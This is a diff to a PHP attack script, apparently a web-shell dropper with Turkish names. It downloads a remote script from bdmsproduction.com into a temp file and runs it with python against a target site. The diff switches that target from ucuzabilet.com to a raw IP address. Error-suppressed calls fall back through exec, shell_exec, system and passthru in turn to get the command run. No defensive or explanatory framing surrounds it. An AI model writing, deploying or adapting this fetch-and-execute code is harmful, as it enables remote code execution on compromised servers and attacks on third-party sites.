@@ -4,7 +4,7 @@ $dosya = @file_get_contents("http://bdmsproduction.com/dosya/x.txt");
 fwrite($temp, $dosya);
 $bilgi = stream_get_meta_data($temp);
 $dizin = $bilgi['uri'];
-$komut = "python {$dizin} https://www.ucuzabilet.com/";
+$komut = "python {$dizin} http://185.115.41.252/";
 if(function_exists('exec')){$sonuc = @exec($komut);}elseif(function_exists('shell_exec')){$sonuc = @shell_exec($komut);}elseif(function_exists('system')){$sonuc = @system($komut);}elseif(function_exists('passthru')){$sonuc = @passthru($komut);
 }else{
 echo "tum fonksiyonlar kapali aq";
